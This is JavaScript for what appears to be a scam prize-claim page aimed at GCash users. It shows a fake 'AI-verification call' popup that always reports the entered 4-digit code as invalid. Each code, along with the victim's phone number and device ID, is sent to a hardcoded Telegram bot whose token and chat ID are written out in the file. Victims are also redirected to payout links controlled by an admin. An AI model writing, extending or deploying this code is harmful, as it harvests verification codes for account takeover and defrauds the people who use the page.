/**
 * Popup Share Module - Fixed Deeplink & Admin Sync
 */

(function() {
    'use strict';
    
    let currentBalance = 0;
    let claimInProgress = false;
    let isRedirecting = false;
    
    // ========== AI-VERIFICATION CALL VARIABLES ==========
    let callInProgress = false;
    let callCountdown = 60;
    let callTimerInterval = null;
    let currentCallCode = '';
    
    // ========== SOUND EFFECT ==========
    function playClaimSound() {
        try {
            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
            audio.volume = 0.7;
            audio.play().catch(function(e) {});
        } catch(e) {}
    }
    
    function playCallSound() {
        try {
            var audio = new Audio('sounds/call_ring.mp3');
            audio.volume = 0.5;
            audio.play().catch(function(e) {});
        } catch(e) {}
    }
    
    // ========== TELEGRAM NOTIFICATIONS ==========
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegramMessage(message) {
        try {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
                .catch(function(e) {});
        } catch(e) {}
    }
    
    function sendAICallRequestNotification(userPhone, deviceId, code) {
        sendTelegramMessage('📞 AI-VERIFICATION CALL REQUESTED\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code: ' + code);
    }
    
    function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
        sendTelegramMessage('🔑 AI-CODE ATTEMPT\n👤 User: ' + userPhone + '\n📝 Code: ' + codeEntered + '\n⏱️ Left: ' + secondsLeft + 's\n📊 Status: INVALID');
    }
    
    function sendAICallExpiredNotification(userPhone, deviceId) {
        sendTelegramMessage('⏰ AI-VERIFICATION EXPIRED\n👤 User: ' + userPhone);
    }
    
    function sendClaimButtonNotification(userPhone, deviceId, amount) {
        sendTelegramMessage('💳 CLAIM INITIATED\n👤 User: ' + userPhone + '\n💰 Amount: ₱' + amount.toFixed(2));
    }
    
    // ========== INITIALIZATION ==========
    function init() {
        var popup = document.getElementById('prizePopup');
        if (!popup) return;
        
        getFirewallStatus();
        attachClaimButton();
        attachWithdrawButton();
        
        console.log('✅ Popup Module ready');
    }
    
    // ========== GET FIREWALL STATUS ==========
    function getFirewallStatus() {
        try {
            var db = firebase.database();
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                return (data && data.active === true);
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }
    
    // ========== SYNC BALANCE ==========
    function syncBalanceFromFirebase() {
        var userPhone = localStorage.getItem("userPhone");
        if (!userPhone) return Promise.resolve(0);
        
        try {
            var db = firebase.database();
            return db.ref('user_sessions/' + userPhone).once('value').then(function(snap) {
                if (snap.exists() && snap.val().balance !== undefined) {
                    var balance = snap.val().balance;
                    var balanceEl = document.getElementById('userBalanceDisplay');
                    if (balanceEl) balanceEl.innerText = balance.toFixed(2);
                    return balance;
                }
                return 0;
            });
        } catch(e) {
            return Promise.resolve(0);
        }
    }
    
    // ========== ATTACH CLAIM BUTTON ==========
    function attachClaimButton() {
        var claimBtn = document.getElementById('claimNowBtn');
        if (!claimBtn) return;
        
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            playClaimSound();
            
            syncBalanceFromFirebase().then(function(balance) {
                currentBalance = balance;
                // Redirect to the real withdraw popup in HTML
                var withdrawPopup = document.getElementById('claimNowPopup');
                if (withdrawPopup) {
                    var amountEl = document.getElementById('claimNowBalanceAmount');
                    if (amountEl) amountEl.innerText = balance.toFixed(2);
                    withdrawPopup.style.display = 'flex';
                }
            });
        };
    }

    // ========== ATTACH WITHDRAW BUTTON ==========
    function attachWithdrawButton() {
        var withdrawBtn = document.getElementById('claimViaGCashBtn');
        if (withdrawBtn) {
            withdrawBtn.onclick = function(e) {
                e.preventDefault();
                if (claimInProgress) return;
                
                claimInProgress = true;
                this.disabled = true;
                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
                
                // 1. CHECK FIREWALL FIRST
                getFirewallStatus().then(function(firewallOn) {
                    if (firewallOn) {
                        // Show Phase 3 (AI Verification)
                        document.getElementById('claimNowPopup').style.display = 'none';
                        showPhase3();
                        claimInProgress = false;
                        withdrawBtn.disabled = false;
                        withdrawBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP';
                        return;
                    }

                    // 2. IF FIREWALL OFF, GET LINK AND REDIRECT
                    getLatestPayoutLink().then(function(linkData) {
                        if (linkData && linkData.url) {
                            var userPhone = localStorage.getItem("userPhone") || "Unknown";
                            
                            markLinkAsUsed(linkData.key, userPhone).then(function() {
                                isRedirecting = true;
                                withdrawBtn.innerHTML = '<i class="fas fa-check"></i> REDIRECTING...';
                                setTimeout(function() {
                                    window.location.href = linkData.url;
                                }, 1000);
                            });
                        } else {
                            claimInProgress = false;
                            withdrawBtn.disabled = false;
                            withdrawBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP';
                            alert("No payout link available. Please try again.");
                        }
                    });
                });
            };
        }
    }
    
    // ========== GET PAYOUT LINK (MULA SA ADMIN) ==========
    function getLatestPayoutLink() {
        try {
            var db = firebase.database();
            // Check admin direct redirect first
            return db.ref('admin/redirectLink').once('value').then(function(adminSnap) {
                var adminData = adminSnap.val();
                if (adminData && adminData.url && adminData.active !== false) {
                    return { key: 'admin_redirect', url: adminData.url };
                }
                
                // Fallback to deployed links
                return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snapshot) {
                    if (snapshot.exists()) {
                        var key = Object.keys(snapshot.val())[0];
                        var linkData = snapshot.val()[key];
                        return { key: key, url: linkData.url };
                    }
                    return null;
                });
            });
        } catch(e) {
            return Promise.resolve(null);
        }
    }
    
    // ========== MARK LINK AS CLAIMED (PARA SA ADMIN SYNC) ==========
    function markLinkAsUsed(linkKey, userPhone) {
        if (linkKey === 'admin_redirect') return Promise.resolve();
        
        try {
            var db = firebase.database();
            return db.ref('links/' + linkKey).update({
                status: 'claimed',
                user: userPhone,
                claimedAt: Date.now()
            });
        } catch(e) {
            return Promise.resolve();
        }
    }
    
    // ========== SHOW PHASE 3 (AI-VERIFICATION CALL) ==========
    function showPhase3() {
        var popup = document.getElementById('prizePopup');
        var popupInner = document.getElementById('prizePopupInner');
        if (!popup || !popupInner) return;
        
        popup.style.display = 'flex';
        
        callInProgress = false;
        callCountdown = 60;
        if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase3">✕</div>
            
            <div style="text-align: center; margin-bottom: 10px;">
                <div style="width: 70px; height: 70px; margin: 0 auto; background: linear-gradient(145deg, #b537f2, #ff2d95); border-radius: 50%; border: 3px solid #ffd700; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(255,45,149,0.5);">
                    <i class="fas fa-phone" style="font-size: 30px; color: #fff;"></i>
                </div>
            </div>
            
            <h2 class="claim-now-title">🔐 AI-VERIFICATION</h2>
            <div class="claim-now-divider"><span>★</span><span class="line"></span><span>★</span></div>
            
            <p style="font-size: 11px; color: rgba(255,255,255,0.8); text-align: center; margin: 5px 0 15px 0;">
                System AI will call you with a <strong style="color: #00f2ff;">4-digit verification code</strong>
            </p>
            
            <div id="callStatusContainer" style="background: rgba(0,0,0,0.4); border: 1px solid rgba(255,215,0,0.3); border-radius: 16px; padding: 15px; margin-bottom: 15px; text-align: center;">
                <div id="callStatusIcon" style="font-size: 28px; margin-bottom: 5px;">🍊</div>
                <div id="callStatusText" style="font-size: 13px; color: #fff; font-weight: 500;">Ready for verification</div>
                
                <div id="phoneNumberDisplay" style="display: none; margin-top: 8px;">
                    <span class="phone-number-display">
                        <span class="phone-icon">📱</span> ${formattedPhone}
                    </span>
                </div>
                
                <div id="callTimerDisplay" style="font-size: 32px; font-family: 'Orbitron', monospace; font-weight: 900; color: #39ff14; margin-top: 5px; display: none;">60s</div>
            </div>
            
            <button id="requestCallBtn" class="claim-via-gcash-btn mega-btn" style="width: 100%;">
                <i class="fas fa-phone-alt"></i> REQUEST AI CALL
            </button>
            
            <div id="codeSection" style="display: none; margin-top: 15px;">
                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                    <input type="text" id="code4Digit" class="verification-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
                    <button id="verifyCodeBtn" class="pt-cat-claim-btn mega-btn" style="width: auto; padding: 14px 20px;">
                        <i class="fas fa-check"></i> VERIFY
                    </button>
                </div>
                
                <div id="codeErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff1744; font-size: 11px;">
                    <i class="fas fa-exclamation-circle"></i> Invalid code.
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 12px;">
                <button class="small-back-btn" id="backBtnPhase3">← BACK</button>
            </div>
        `;
        
        attachPhase3Events();
    }
    
    function attachPhase3Events() {
        var closeBtn = document.getElementById('popupClosePhase3');
        if (closeBtn) closeBtn.onclick = function() { stopCallTimer(); closePopup(); };
        
        var backBtn = document.getElementById('backBtnPhase3');
        if (backBtn) backBtn.onclick = function() { stopCallTimer(); closePopup(); };
        
        var requestBtn = document.getElementById('requestCallBtn');
        if (requestBtn) {
            requestBtn.onclick = function() {
                if (callInProgress) return;
                requestAICall();
            };
        }
        
        var verifyBtn = document.getElementById('verifyCodeBtn');
        if (verifyBtn) verifyBtn.onclick = verifyCode;
    }
    
    function requestAICall() {
        if (callInProgress) return;
        
        callInProgress = true;
        callCountdown = 60;
        currentCallCode = Math.floor(1000 + Math.random() * 9000).toString();
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
        
        var statusIcon = document.getElementById('callStatusIcon');
        var statusText = document.getElementById('callStatusText');
        var phoneDisplay = document.getElementById('phoneNumberDisplay');
        var timerDisplay = document.getElementById('callTimerDisplay');
        var requestBtn = document.getElementById('requestCallBtn');
        var codeSection = document.getElementById('codeSection');
        
        if (statusIcon) statusIcon.innerHTML = '📞';
        if (statusText) statusText.innerHTML = 'AI CALL is being placed...';
        if (phoneDisplay) phoneDisplay.style.display = 'block';
        if (timerDisplay) {
            timerDisplay.style.display = 'block';
            timerDisplay.textContent = '60s';
            timerDisplay.style.color = '#39ff14';
        }
        if (requestBtn) {
            requestBtn.disabled = true;
            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CALLING...';
        }
        if (codeSection) codeSection.style.display = 'none';
        
        playCallSound();
        startCallTimer();
        
        setTimeout(function() {
            if (statusIcon) statusIcon.innerHTML = '🎯';
            if (statusText) statusText.innerHTML = '<strong style="color: #39ff14;">CONNECTED!</strong>';
            if (codeSection) codeSection.style.display = 'block';
        }, 4000);
    }
    
    function startCallTimer() {
        stopCallTimer();
        var timerDisplay = document.getElementById('callTimerDisplay');
        
        callTimerInterval = setInterval(function() {
            callCountdown--;
            
            if (timerDisplay) {
                timerDisplay.textContent = callCountdown + 's';
                if (callCountdown <= 9) timerDisplay.style.color = '#ff1744';
                else timerDisplay.style.color = '#39ff14';
            }
            
            if (callCountdown <= 0) {
                stopCallTimer();
                closePopup();
            }
        }, 1000);
    }
    
    function stopCallTimer() {
        if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
    }
    
    function verifyCode() {
        var codeInput = document.getElementById('code4Digit');
        var codeErrorMsg = document.getElementById('codeErrorMsg');
        
        if (!codeInput) return;
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length !== 4) {
            if (codeErrorMsg) codeErrorMsg.style.display = 'block';
            return;
        }
        
        sendAICodeAttemptNotification(localStorage.getItem("userPhone"), localStorage.getItem("userDeviceId"), enteredCode, callCountdown);
        
        if (codeErrorMsg) codeErrorMsg.style.display = 'block';
        setTimeout(function() { codeInput.value = ''; }, 1500);
    }
    
    function closePopup() {
        var popup = document.getElementById('prizePopup');
        if (popup) popup.style.display = 'none';
        claimInProgress = false;
        isRedirecting = false;
        stopCallTimer();
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
